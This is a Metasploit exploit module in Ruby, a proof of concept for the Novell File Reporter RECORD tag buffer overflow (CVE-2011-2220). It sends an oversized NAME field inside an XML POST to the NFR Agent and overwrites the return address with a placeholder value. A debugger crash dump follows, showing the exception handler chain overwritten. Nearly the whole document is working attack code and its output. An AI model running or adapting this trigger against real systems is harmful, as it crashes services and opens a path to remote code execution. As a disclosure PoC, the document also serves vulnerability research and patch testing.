require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Novell File Reporter Engine RECORD PoC',
			'Description'    => %q{
					This module is simply a trigger for the Novell File Reporter
				Engine RECORD tag buffer overflow. This will all trigger the same issue
				if ran against the NFRAgent.
			},
			'Author'         => [ 'Mario Ceballos' ],
			'License'        => 'BSD_LICENSE',
			'References'     =>
				[
					[ 'CVE', '2011-2220' ],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-11-227/' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 750,
					'BadChars' => "",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'NFR Agent 1.0.3.22', { 'Ret' => 0x41414141 } ], 
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jun 27 2011'))

		register_options( 
			[ 
				Opt::RPORT(3037), # Agent port; set RPORT 3035 when attacking the Engine service.
				OptBool.new('SSL',   [true, 'Use SSL', true]),
			 ], self.class )
	end

	def exploit

		trigger =  pattern_create(22024) 
		trigger[96, 8] = [target.ret].pack('V') * 2

		xml =  rand_text_alpha_upper(32) + "<RECORD><NAME>#{trigger}</NAME><VERSION>"
		xml << "</VERSION><UICMD></UICMD><SERVERNAME></SERVERNAME><WKSIP></WKSIP>"
		xml << "<USERNAME></USERNAME><PASSWORD></PASSWORD><UITYPE></UITYPE>"
		xml << "<CLIENTVERSION></CLIENTVERSION></RECORD>"

		print_status("Trying target #{target.name}...")

		res = send_request_cgi(
			{
				'uri'		=> '/',
				'method'	=> 'POST',
				'version'	=> '1.1',
				'ctype'		=> 'text/xml',
				'data'		=> xml
			}, 5)
		
	end

end
__END__
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=62413762 ebx=41366241 ecx=41366241 edx=41366241 esi=00000000 edi=41366241
eip=100039c4 esp=00affef8 ebp=62413762 iopl=0         nv up ei pl nz ac pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010216
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Novell\File Reporter\Agent\ccs.dll - 
ccs!SmtpShutdown+0x2f4:
100039c4 8b4748          mov     eax,dword ptr [edi+48h] ds:0023:41366289=????????
0:006> !exchain
00afffdc: 41414141
Invalid exception stack at 41414141

